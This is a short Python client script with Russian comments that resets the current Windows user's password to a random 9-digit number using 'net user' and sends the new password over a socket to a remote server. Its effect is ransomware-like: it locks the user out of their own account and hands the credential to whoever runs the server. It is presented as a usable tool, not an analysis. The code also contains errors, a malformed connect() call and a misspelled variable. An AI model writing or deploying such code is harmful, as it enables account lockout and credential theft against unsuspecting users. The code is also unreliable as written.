# coding=utf-8
# Изменить пароль окна
# client.py

import socket
import getpass
import subprocess
import random

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Создать экземпляр сокета
client.connect('127.0.0.1', 55555)  # Подключите IP-адрес / порт сервера в соответствии с вашей реальной ситуацией
user = getpass.getuser()  # Получить имя пользователя компьютера
psd = ''

for j in range(1, 10):  # Создать 1-9 случайных чисел
    m = str(random.randrange(0, 10))
    psd = psd + m

subprocess.Popen(['net', 'User', user, psd])  # Выполнить локально (аналогично команде cmd)
client.send(psd.encode('utf-8'))  # Отправляем пароль на сервер
back_msg = clien.recv(1024)
client.close()  # Закрыть сокет
print(psd)